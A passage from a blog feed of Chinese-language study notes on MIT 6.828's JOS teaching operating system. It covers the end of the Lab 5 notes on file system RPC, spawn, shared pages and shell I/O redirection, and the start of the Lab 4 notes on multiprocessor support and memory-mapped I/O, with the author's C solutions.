class="title">fd</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(path) &gt;= MAXPATHLEN)         <span class="comment">//文件名不能超过指定长度</span></span><br><span class="line">        <span class="keyword">return</span> -E_BAD_PATH;</span><br><span class="line">    <span class="keyword">if</span> ((r = fd_alloc(&amp;fd)) &lt; <span class="number">0</span>)            <span class="comment">//搜索当前进程未被分配的文件描述符</span></span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    <span class="built_in">strcpy</span>(fsipcbuf.open.req_path, path);</span><br><span class="line">    fsipcbuf.open.req_omode = mode;</span><br><span class="line">    <span class="keyword">if</span> ((r = fsipc(FSREQ_OPEN, fd)) &lt; <span class="number">0</span>) &#123;  <span class="comment">//通过fsipc()向FS进程发起RPC调用</span></span><br><span class="line">        fd_close(fd, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fd2num(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">fsipc(<span class="keyword">unsigned</span> type, <span class="keyword">void</span> *dstva)       <span class="comment">//type, fsipcbuf是发送给fs进程的数据。dstava和fsipc()的返回值是从fs进程接收的值</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">envid_t</span> fsenv;</span><br><span class="line">    <span class="keyword">if</span> (fsenv == <span class="number">0</span>)</span><br><span class="line">        fsenv = ipc_find_env(ENV_TYPE_FS);</span><br><span class="line">    <span class="keyword">static_assert</span>(<span class="keyword">sizeof</span>(fsipcbuf) == PGSIZE);</span><br><span class="line"></span><br><span class="line">    ipc_send(fsenv, type, &amp;fsipcbuf, PTE_P | PTE_W | PTE_U);  <span class="comment">//向FS进程发送数据</span></span><br><span class="line">    <span class="keyword">return</span> ipc_recv(<span class="literal">NULL</span>, dstva, <span class="literal">NULL</span>);         <span class="comment">//接收FS进程发送回来的数据</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中fd_alloc()定义在lib/fd.c中，</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">fd_alloc(struct Fd **fd_store)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Fd</span> *<span class="title">fd</span>;</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXFD; i++) &#123;   <span class="comment">//从当前最小的未分配描述符开始</span></span><br><span class="line">        fd = INDEX2FD(i);</span><br><span class="line">        <span class="keyword">if</span> ((uvpd[PDX(fd)] &amp; PTE_P) == <span class="number">0</span> || (uvpt[PGNUM(fd)] &amp; PTE_P) == <span class="number">0</span>) &#123;</span><br><span class="line">            *fd_store = fd;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *fd_store = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> -E_MAX_OPEN;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab5/lab5_7_open()%E5%8E%9F%E7%90%86.png" alt="lab5_7_open原理.png"></p><p>每个进程从虚拟地址0xD0000000开始，每一页对应一个FD结构，也就是说文件描述符0对应的FD结构地址为0xD0000000，文件描述符1对应的FD结构地址为0xD0000000+PGSIZE，以此类推。可以通过检查某个FD结构的虚拟地址是否分配，来判断文件描述符是否被分配。如果一个文件描述符被分配了，那么该文件描述符对应的FD结构开始的一页将被映射到和FS进程相同的物理地址处。</p><p>FS进程收到FSREQ_OPEN请求后，将调用serve_open()，该函数定义在fs/serv.c中。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">serve_open(<span class="keyword">envid_t</span> envid, struct Fsreq_open *req,</span><br><span class="line">     <span class="keyword">void</span> **pg_store, <span class="keyword">int</span> *perm_store)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> path[MAXPATHLEN];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">File</span> *<span class="title">f</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fileid;</span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">OpenFile</span> *<span class="title">o</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (debug)</span><br><span class="line">        cprintf(<span class="string">&quot;serve_open %08x %s 0x%x\n&quot;</span>, envid, req-&gt;req_path, req-&gt;req_omode);</span><br><span class="line">    <span class="comment">// Copy in the path, making sure it&#x27;s null-terminated</span></span><br><span class="line">    memmove(path, req-&gt;req_path, MAXPATHLEN);</span><br><span class="line">    path[MAXPATHLEN<span class="number">-1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Find an open file ID</span></span><br><span class="line">    <span class="keyword">if</span> ((r = openfile_alloc(&amp;o)) &lt; <span class="number">0</span>) &#123;                 <span class="comment">//从opentab数组中分配一个OpenFile结构</span></span><br><span class="line">        <span class="keyword">if</span> (debug)</span><br><span class="line">            cprintf(<span class="string">&quot;openfile_alloc failed: %e&quot;</span>, r);</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">    fileid = r;</span><br><span class="line">    <span class="comment">// Open the file</span></span><br><span class="line">    <span class="keyword">if</span> (req-&gt;req_omode &amp; O_CREAT) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((r = file_create(path, &amp;f)) &lt; <span class="number">0</span>) &#123;          <span class="comment">//根据path分配一个File结构</span></span><br><span class="line">            <span class="keyword">if</span> (!(req-&gt;req_omode &amp; O_EXCL) &amp;&amp; r == -E_FILE_EXISTS)</span><br><span class="line">                <span class="keyword">goto</span> try_open;</span><br><span class="line">            <span class="keyword">if</span> (debug)</span><br><span class="line">                cprintf(<span class="string">&quot;file_create failed: %e&quot;</span>, r);</span><br><span class="line">            <span class="keyword">return</span> r;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">try_open:</span><br><span class="line">        <span class="keyword">if</span> ((r = file_open(path, &amp;f)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (debug)</span><br><span class="line">                cprintf(<span class="string">&quot;file_open failed: %e&quot;</span>, r);</span><br><span class="line">            <span class="keyword">return</span> r;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Truncate</span></span><br><span class="line">    <span class="keyword">if</span> (req-&gt;req_omode &amp; O_TRUNC) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((r = file_set_size(f, <span class="number">0</span>)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (debug)</span><br><span class="line">                cprintf(<span class="string">&quot;file_set_size failed: %e&quot;</span>, r);</span><br><span class="line">            <span class="keyword">return</span> r;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((r = file_open(path, &amp;f)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (debug)</span><br><span class="line">            cprintf(<span class="string">&quot;file_open failed: %e&quot;</span>, r);</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Save the file pointer</span></span><br><span class="line">    o-&gt;o_file = f;                                      <span class="comment">//保存File结构到OpenFile结构</span></span><br><span class="line">    <span class="comment">// Fill out the Fd structure</span></span><br><span class="line">    o-&gt;o_fd-&gt;fd_file.id = o-&gt;o_fileid;</span><br><span class="line">    o-&gt;o_fd-&gt;fd_omode = req-&gt;req_omode &amp; O_ACCMODE;</span><br><span class="line">    o-&gt;o_fd-&gt;fd_dev_id = devfile.dev_id;</span><br><span class="line">    o-&gt;o_mode = req-&gt;req_omode;</span><br><span class="line">    <span class="keyword">if</span> (debug)</span><br><span class="line">        cprintf(<span class="string">&quot;sending success, page %08x\n&quot;</span>, (<span class="keyword">uintptr_t</span>) o-&gt;o_fd);</span><br><span class="line">    <span class="comment">// Share the FD page with the caller by setting *pg_store,</span></span><br><span class="line">    <span class="comment">// store its permission in *perm_store</span></span><br><span class="line">    *pg_store = o-&gt;o_fd;</span><br><span class="line">    *perm_store = PTE_P|PTE_U|PTE_W|PTE_SHARE;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数首先从opentab这个OpenFile数组中寻找一个未被使用的OpenFile结构，上图中假设找到数据第一个OpenFile结构就是未使用的。如果open()中参数mode设置了O_CREAT选项，那么就会调用fs/fs.c中的file_create函数来根据路径创建一个新的File结构，并保存到OpenFile结构的o_file字段中。结束后，serve()会将OpenFile结构对应的Fd起始地址发送给客户端进程，所以客户进程从open()返回后，新分配的fd和fs进程fd共享相同的物理页。</p><h1 id="Spawning-Processes"><a href="#Spawning-Processes" class="headerlink" title="Spawning Processes"></a>Spawning Processes</h1><p>lib/spawn.c中的spawn()创建一个新的进程，从文件系统加载用户程序，然后启动该进程来允许这个程序。spawn()就像UNIX中的fork()后面马上跟着exec()。</p><p><code>spawn(const char *prog, const char **argv)</code>做如下一系列动作：</p><ol><li>从文件系统打开prog程序文件</li><li>调用系统调用sys_exofork()创建一个新的Env结构</li><li>调用系统调用sys_env_set_trapframe()，设置新的Env结构的Trapframe字段(该字段包含寄存器信息)</li><li>根据ELF文件中program header，将用户程序以Segment读入内存，并映射到指定的线性地址处</li><li>调用系统调用sys_env_set_status()设置新的Env结构状态为ENV_RUNABLE。</li></ol><p><strong>exercise7</strong></p><p>实现sys_env_set_trapframe()系统调用。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sys_env_set_trapframe(<span class="keyword">envid_t</span> envid, struct Trapframe *tf)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 5: Your code here.</span></span><br><span class="line"><span class="comment">// Remember to check whether the user has supplied us with a good</span></span><br><span class="line"><span class="comment">// address!</span></span><br><span class="line"><span class="comment">//panic(&quot;sys_env_set_trapframe not implemented&quot;);</span></span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">e</span>;</span></span><br><span class="line"><span class="keyword">if</span>((r = envid2env(envid,&amp;e,<span class="number">1</span>)) &lt; <span class="number">0</span>) <span class="keyword">return</span> r;</span><br><span class="line">tf-&gt;tf_eflags = FL_IF;</span><br><span class="line">tf-&gt;tf_eflags &amp;= ~FL_IOPL_MASK;<span class="comment">//普通进程不能有IO权限</span></span><br><span class="line">tf-&gt;tf_cs = GD_UT | <span class="number">3</span>;</span><br><span class="line">e-&gt;env_tf = *tf;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Sharing-library-state-across-fork-and-spawn"><a href="#Sharing-library-state-across-fork-and-spawn" class="headerlink" title="Sharing library state across fork and spawn"></a>Sharing library state across fork and spawn</h2><p>UNIX文件描述符是一个大的概念，包含pipe，控制台I/O。在JOS中每种设备对应一个struct Dev结构，该结构函数函数指针，指向真正实现读写操作的函数。</p><p>lib/fd.c文件实现了UNIX文件描述符接口，但大部分函数都是简单对struct Dev结构指向的函数的包装。</p><p>我们希望共享文件描述符，JOS中定义PTE新的标志位PTE_SHARE，如果有个页表条目的PTE_SHAER标志位为1，那么这个PTE在fork()和spawn()中将直接拷贝到子进程页表，从而让父进程和子进程共享相同的页映射关系，从而达到父子进程共享文件描述符的目的。</p><p><strong>exercise8</strong></p><p>修改lib/fork.c中的duppage()，使之正确处理有PTE_SHARE标志的页表条目。同时实现lib/spawn.c中的copy_shared_pages()。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">duppage(<span class="keyword">envid_t</span> envid, <span class="keyword">unsigned</span> pn)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="keyword">void</span> *addr = (<span class="keyword">void</span>*) (pn * PGSIZE);</span><br><span class="line"><span class="keyword">if</span>(uvpt[pn] &amp; PTE_SHARE)&#123;</span><br><span class="line">sys_page_map(<span class="number">0</span>, addr, envid, addr, PTE_SYSCALL);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> ((uvpt[pn] &amp; PTE_W) || (uvpt[pn] &amp; PTE_COW)) &#123; <span class="comment">//对于UTOP以下的可写的或者写时拷贝的页，拷贝映射关系的同时，需要同时标记当前进程和子进程的页表项为PTE_COW</span></span><br><span class="line"><span class="keyword">if</span> ((r = sys_page_map(<span class="number">0</span>, addr, envid, addr, PTE_COW|PTE_U|PTE_P)) &lt; <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;sys_page_map：%e&quot;</span>, r);</span><br><span class="line"><span class="keyword">if</span> ((r = sys_page_map(<span class="number">0</span>, addr, <span class="number">0</span>, addr, PTE_COW|PTE_U|PTE_P)) &lt; <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;sys_page_map：%e&quot;</span>, r);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">sys_page_map(<span class="number">0</span>, addr, envid, addr, PTE_U|PTE_P);<span class="comment">//对于只读的页，只需要拷贝映射关系即可</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>copy_shared_pages()</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">copy_shared_pages(<span class="keyword">envid_t</span> child)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 5: Your code here.</span></span><br><span class="line"><span class="keyword">uintptr_t</span> addr;</span><br><span class="line"><span class="keyword">for</span> (addr = <span class="number">0</span>; addr &lt; UTOP; addr += PGSIZE) &#123;</span><br><span class="line"><span class="keyword">if</span> ((uvpd[PDX(addr)] &amp; PTE_P) &amp;&amp; (uvpt[PGNUM(addr)] &amp; PTE_P) &amp;&amp;</span><br><span class="line">(uvpt[PGNUM(addr)] &amp; PTE_U) &amp;&amp; (uvpt[PGNUM(addr)] &amp; PTE_SHARE)) &#123;</span><br><span class="line">            sys_page_map(<span class="number">0</span>, (<span class="keyword">void</span>*)addr, child, (<span class="keyword">void</span>*)addr, (uvpt[PGNUM(addr)] &amp; PTE_SYSCALL));</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="The-keyboard-interface"><a href="#The-keyboard-interface" class="headerlink" title="The keyboard interface"></a>The keyboard interface</h1><p><strong>exercise9</strong></p><p>在trap.c的trap_dispatch中加入下面的代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (tf-&gt;tf_trapno == IRQ_OFFSET + IRQ_KBD)&#123;</span><br><span class="line">kbd_intr();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tf-&gt;tf_trapno == IRQ_OFFSET + IRQ_SERIAL)&#123;</span><br><span class="line">serial_intr();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="The-Shell"><a href="#The-Shell" class="headerlink" title="The Shell"></a>The Shell</h1><p>运行make run-icode，将会执行user/icode，user/icode又会执行inti，然后会spawn sh。然后就能运行如下指令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo hello world | cat</span><br><span class="line">cat lorem |cat</span><br><span class="line">cat lorem |num</span><br><span class="line">cat lorem |num |num |num |num |num</span><br><span class="line">lsfd</span><br></pre></td></tr></table></figure><p><strong>Exercise 10</strong></p><p>目前shell还不支持IO重定向，修改user/sh.c，增加IO该功能。</p><p>在runcmd函数中添加如下片段：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>((fd = open(t,O_RDONLY)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">cprintf(<span class="string">&quot;file %s is no exist\n&quot;</span>, t);</span><br><span class="line"><span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(fd != <span class="number">0</span>)&#123;</span><br><span class="line">dup(fd,<span class="number">0</span>);</span><br><span class="line">close(fd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li><p>构建文件系统：</p><ol><li><p>引入一个文件系统进程的特殊进程，该进程提供文件操作的接口。具体实现在fs/bc.c、fs/fs.c、fs/serv.c中</p></li><li><p>建立RPC机制，客户端进程向FS进程发送请求，FS进程真正执行文件操作。客户端进程的实现在lib/file.c，lib/fd.c中。客户端进程和FS进程交互可总结为下图</p><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab5/lab5_6_fs%E8%BF%9B%E7%A8%8B%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86.png" alt="客户端进程和FS进程交互"></p></li><li><p>更高级的抽象，引入文件描述符。通过文件描述符这一层抽象可以将控制台，pipe，普通文件统统按照文件来对待。文件描述符和pipe的原理总结如下：</p><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab5/lab5_5_%E6%96%87%E4%BB%B6_fd%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86_pipe%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86.png" alt="文件描述符和pipe原理"></p></li></ol></li><li><p>支持从磁盘加载程序并运行。实现spawn()，该函数创建一个新的进程，并从磁盘加载程序运行，类似UNIX中的fork()后执行exec()。</p></li></ol><p><img src="https://inews.gtimg.com/newsapp_ls/0/13929718502/0" alt="image-20210828225527202"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;File-system-preliminaries&quot;&gt;&lt;a href=&quot;#File-system-preliminaries&quot; class=&quot;headerlink&quot; title=&quot;File system preliminaries&quot;&gt;&lt;/a&gt;File system
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="OS" scheme="https://billyotry.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>【MIT 6.828】JOS学习笔记 Lab4</title>
    <link href="https://billyotry.github.io/2021/08/08/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab4/"/>
    <id>https://billyotry.github.io/2021/08/08/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab4/</id>
    <published>2021-08-08T14:12:16.641Z</published>
    <updated>2021-08-28T14:44:00.449Z</updated>
    
    <content type="html"><![CDATA[<p>在lab4中多了如下文件：kern/cpu.h、kern/mpconfig.c、kern/lapic.c、kern/mpentry.S、kern/spinlock.h、kern/spinlock.c、kern/sched.c</p><h2 id="Part-A-Multiprocessor-Support-and-Cooperative-Multitasking"><a href="#Part-A-Multiprocessor-Support-and-Cooperative-Multitasking" class="headerlink" title="Part A: Multiprocessor Support and Cooperative Multitasking"></a>Part A: Multiprocessor Support and Cooperative Multitasking</h2><p>在这个lab的第一部分，我们首先拓展JOS让其能在多处理器系统上运行，然后实现一些新的JOS内核系统调用以允许用户级环境创建额外的新环境。还将实现协作循环调度，当当前环境自愿放弃CPU(或退出)时，允许内核从一种环境切换到另一种环境。在第三部分中，还将实现抢占式调度，即使环境不合作，它也允许内核在经过一定时间后从环境中重新控制CPU。</p><h3 id="Multiprocessor-Support"><a href="#Multiprocessor-Support" class="headerlink" title="Multiprocessor Support"></a>Multiprocessor Support</h3><p>我们将让JOS支持”对称多处理”(SMP)，一种多处理器模型，其中所有CPU都具有对系统资源(如内存和IO总线)的同等访问权限。虽然在SMP模型中所有的CPU的功能都是相同的，但是启动的过程中，还是可以分为两种类型：引导处理器(BSP)负责初始化系统和引导操作系统；另一种是只有在操作系统启动并允许后，应用处理器(AP)才会被BSP激活。哪个处理器作为BSP是由硬件和BIOS决定。到目前为止，我们所有的JOS代码都已在BSP上允许。</p><p>在SMP系统中，每个CPU都有一个伴随的本地APIC(LAPIC) 单元。LAPIC单元负责在整个系统中传送中断。LAPIC还为其连接的 CPU提供唯一标识符，在本lab中，我们使用LAPIC单元的以下基本功能(kern/lapic.c)：</p><ul><li>读取LAPIC标识符(APIC ID)来判断我们的代码现在允许在哪个CPU上(查看cpunum())</li><li>从BSP向AP发送STARTUP处理器间中断(IPI)以启动其他CPU(查看lapic_startap())</li><li>在第三部分，我们对LAPIC的内置定时器进行编程以触发时钟中断以支持抢占式多任务处理(查看apic_init())</li></ul><p>处理器访问LAPIC使用内存映射IO(MMIO)，这样就能通过访问内存达到访问设备寄存器的目的。LAPIC从物理地址0xFE000000开始，JOS将通过MMIOBASE虚拟地址访问该物理地址。</p><p><strong>exercise1</strong></p><p>实现文件kern/pmap.c中的mmio_map_region函数。这个函数管理内存映射IO地址，输入一个在范围内的物理地址，函数返回一个虚拟地址，那么这个物理地址就被映射到这个虚拟地址上。这个也是一个分配器，比较原始，原理就和boot_alloc类似。从MMIOBASE开始分配，每次分配都是以页为单位。故函数维持了一个全局变量，表示当前分配到的地址，并将参数上调到<code>4096</code>的边界。这些操作和boot_alloc一样。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">mmio_map_region(<span class="keyword">physaddr_t</span> pa, <span class="keyword">size_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Where to start the next region.  Initially, this is the</span></span><br><span class="line"><span class="comment">// beginning of the MMIO region.  Because this is static, its</span></span><br><span class="line"><span class="comment">// value will be preserved between calls to mmio_map_region</span></span><br><span class="line"><span class="comment">// (just like nextfree in boot_alloc).</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uintptr_t</span> base = MMIOBASE;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Reserve size bytes of virtual memory starting at base and</span></span><br><span class="line"><span class="comment">// map physical pages [pa,pa+size) to virtual addresses</span></span><br><span class="line"><span class="comment">// [base,base+size).  Since this is device memory and not</span></span><br><span class="line"><span class="comment">// regular DRAM, you&#x27;ll have to tell the CPU that it isn&#x27;t</span></span><br><span class="line"><span class="comment">// safe to cache access to this memory.  Luckily, the page</span></span><br><span class="line"><span class="comment">// tables provide bits for this purpose; simply create the</span></span><br><span class="line"><span class="comment">// mapping with PTE_PCD|PTE_PWT (cache-disable and</span></span><br><span class="line"><span class="comment">// write-through) in addition to PTE_W.  (If you&#x27;re interested</span></span><br><span class="line"><span class="comment">// in more details on this, see section 10.5 of IA32 volume</span></span><br><span class="line"><span class="comment">// 3A.)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Be sure to round size up to a multiple of PGSIZE and to</span></span><br><span class="line"><span class="comment">// handle if this reservation would overflow MMIOLIM (it&#x27;s</span></span><br><span class="line"><span class="comment">// okay to simply panic if this happens).</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint: The staff solution uses boot_map_region.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Your code here:</span></span><br><span class="line"><span class="comment">//panic(&quot;mmio_map_region not implemented&quot;);</span></span><br><span class="line"><span class="keyword">void</span> *ret = (<span class="keyword">void</span>*)base;</span><br><span class="line">size = ROUNDUP(size,PGSIZE);</span><br><span class="line"><span class="keyword">if</span>(base + size &gt; MMIOLIM || base + size &lt; base)&#123;</span><br><span class="line">panic(<span class="string">&quot;mmio_map_region(): overflow&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">boot_map_region(kern_pgdir,base,size,pa,PTE_W|PTE_PCD|PTE_PWT);</span><br><span class="line">base += size;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Application-Processor-Bootstrap"><a href="#Application-Processor-Bootstrap" class="headerlink" title="Application Processor Bootstrap"></a>Application Processor Bootstrap</h4><p>在启动AP之前，BSP需要搜集多处理器的信息，比如总共有多少个CPU，它们的LAPIC ID以及LAPIC MMIO地址。mp_init函数从BIOS中读取这些信息。具体代码在mp_init中，该函数会在进入内核后由i386_init函数调用，主要作用就是读取mp configuration table中保存的CPU信息，初始化cpus数组，ncpu(总共可用的CPU个数)，bootcput指针(指向BSP对应的CpuInfo结构)。</p><p>boot_aps函数驱动AP引导程序，AP以实模式启动，很像引导程序在boot/boot.S中的启动方式，因此boot_aps函数将AP入口代码复制到实模式下寻址的内存位置。与引导加载程序不同的是，我们可以控制AP开始执行代码的位置，我们将入口代码复制到0x7000，但任何未使用的、页面对齐的低于640kb的物理地址都可以使用。</p><p>之后，boot_aps函数通过发送STARTUP的IPI(处理器间中断)信号到AP的LAPIC单元来一个个激活AP。在kern/mpentry.S中的入口代码跟boot/boot.S中的代码类似。在一些简短的配置后，它使AP进入开启分页机制的保护模式，调用C语言的setup函数mp_main。boot_aps 等待AP在其结构CpuInfo的cpu_status字段中发出CPU_STARTED标志信号，然后再唤醒下一个。</p><p><strong>exercise2</strong></p><p>我们需要修改我们kern/pmap.c中page_init函数的代码，来表示MPENTRY_PADDR处的地址已经不再是free的状态。因为这段地址已经被AP的引导器所占用。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">page_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 4:</span></span><br><span class="line"><span class="comment">// Change your code to mark the physical page at MPENTRY_PADDR</span></span><br><span class="line"><span class="comment">// as in use</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The example code here marks all physical pages as free.</span></span><br><span class="line"><span class="comment">// However this is not truly the case.  What memory is free?</span></span><br><span class="line"><span class="comment">//  1) Mark physical page 0 as in use.</span></span><br><span class="line"><span class="comment">//     This way we preserve the real-mode IDT and BIOS structures</span></span><br><span class="line"><span class="comment">//     in case we ever need them.  (Currently we don&#x27;t, but...)</span></span><br><span class="line"><span class="comment">//  2) The rest of base memory, [PGSIZE, npages_basemem * PGSIZE)</span></span><br><span class="line"><span class="comment">//     is free.</span></span><br><span class="line"><span class="comment">//  3) Then comes the IO hole [IOPHYSMEM, EXTPHYSMEM), which must</span></span><br><span class="line"><span class="comment">//     never be allocated.</span></span><br><span class="line"><span class="comment">//  4) Then extended memory [EXTPHYSMEM, ...).</span></span><br><span class="line"><span class="comment">//     Some of it is in use, some is free. Where is the kernel</span></span><br><span class="line"><span class="comment">//     in physical memory?  Which pages are already in use for</span></span><br><span class="line"><span class="comment">//     page tables and other data structures?</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Change the code to reflect this.</span></span><br><span class="line"><span class="comment">// NB: DO NOT actually touch the physical memory corresponding to</span></span><br><span class="line"><span class="comment">// free pages!</span></span><br><span class="line"><span class="comment">/*size_t i;</span></span><br><span class="line"><span class="comment">for (i = 0; i &lt; npages; i++) &#123;</span></span><br><span class="line"><span class="comment">pages[i].pp_ref = 0;</span></span><br><span class="line"><span class="comment">pages[i].pp_link = page_free_list;</span></span><br><span class="line"><span class="comment">page_free_list = &amp;pages[i];</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//mark page 0 as in use --1</span></span><br><span class="line">pages[<span class="number">0</span>].pp_ref = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//mark page [1,npages_basemem_before) in use</span></span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">size_t</span> npages_basemem_before = MPENTRY_PADDR / PGSIZE;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>;i &lt; npages_basemem_before;i++)&#123;</span><br><span class="line">pages[i].pp_ref = <span class="number">0</span>;</span><br><span class="line">pages[i].pp_link = page_free_list;</span><br><span class="line">page_free_list = &amp;pages[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// skip the MPENTRY_PADDR</span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> mpentry_start[], mpentry_end[];</span><br><span class="line"><span class="keyword">size_t</span> mpentry_lent = mpentry_end - mpentry_start;</span><br><span class="line"><span class="keyword">size_t</span> npages_mpentry = mpentry_lent / PGSIZE;</span><br><span class="line"><span class="keyword">size_t</span> mpentry_more = mpentry_lent % PGSIZE;</span><br><span class="line"><span class="keyword">if</span>(mpentry_more)&#123;</span><br><span class="line">npages_mpentry++;</span><br><span class="line">&#125;</span><br><span class="line">i = npages_basemem_before + npages_mpentry;</span><br><span class="line"><span class="keyword">for</span>(;i &lt; npages_basemem;i++)&#123;</span><br><span class="line">pages[i].pp_ref = <span class="number">0</span>;</span><br><span class="line">pages[i].pp_link = page_free_list;</span><br><span class="line">page_free_list = &amp;pages[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 